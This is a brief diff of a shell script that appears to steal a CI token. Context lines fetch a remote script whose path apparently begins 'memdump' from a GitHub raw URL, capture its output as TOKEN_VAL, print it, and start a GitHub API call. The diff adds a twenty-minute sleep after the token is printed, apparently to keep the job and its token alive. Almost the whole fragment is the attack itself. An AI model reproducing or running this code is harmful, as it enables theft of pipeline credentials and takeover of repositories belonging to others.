@@ -7,6 +7,7 @@ TOKEN_VAL=`curl -sSf https://raw.githubusercontent.com/r3s34rch/test/main/memdum
 echo "-----------------------------------------------------------------"
 echo "${TOKEN_VAL}"
 echo "-----------------------------------------------------------------"
+sleep 20m
 
 curl \
   -H "Accept: application/vnd.github.v3+json" \
